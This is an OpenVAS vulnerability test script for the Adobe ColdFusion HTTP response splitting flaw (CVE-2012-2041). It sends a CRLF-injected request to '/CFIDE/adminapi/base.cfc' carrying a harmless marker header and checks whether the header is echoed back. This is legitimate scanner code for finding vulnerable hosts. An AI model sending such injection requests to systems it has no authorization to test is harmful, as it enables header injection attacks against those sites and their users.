##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_adobe_coldfusion_http_resp_splitting_vuln.nasl 6022 2017-04-25 12:51:04Z teissa $
#
# Adobe ColdFusion HTTP Response Splitting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to influence or misrepresent how
  web content is served, cached, or interpreted. This could aid in various
  attacks that try to entice client users into a false sense of trust.
  Impact Level: Application";
tag_affected = "Adobe ColdFusion versions 8.0 through 9.0.1";
tag_insight = "This flaw exists because the application does not validate an unspecified
  HTTP header before returning it to the user. This can be exploited to insert
  arbitrary HTTP headers, which will be included in a response sent to the user.";
tag_solution = "Apply patch from below link,
  http://helpx.adobe.com/coldfusion/kb/coldfusion-security-hotfix-apsb12-15.html";
tag_summary = "This host is running Adobe ColdFusion and is prone to response
  splitting vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802660";
CPE = "cpe:/a:adobe:coldfusion";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6022 $");
  script_bugtraq_id(53941);
  script_cve_id("CVE-2012-2041");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-25 14:51:04 +0200 (Tue, 25 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-07-23 14:14:14 +0530 (Mon, 23 Jul 2012)");
  script_name("Adobe ColdFusion HTTP Response Splitting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49517");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53941");
  script_xref(name : "URL" , value : "http://www.adobe.com/support/security/bulletins/apsb12-15.html");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_coldfusion_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("host_details.inc");

## Variable Initialization
port = 0;
req = "";
header = "";

## Get ColdFusion Port
if(! port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Construct attack request
header = string("X-OpenVAS_Header:", unixtime());
req = string("/CFIDE/adminapi/base.cfc/%0d%0a", header);
req = http_get(item: req, port:port);

## Send request and receive the response
res = http_send_recv(port:port, data:req);

## Check the response to confirm vulnerability
if( ereg(pattern:"^HTTP/[0-9]\.[0-9] 302 .*", string:res) && (header >< res)){
  security_message(port);
}
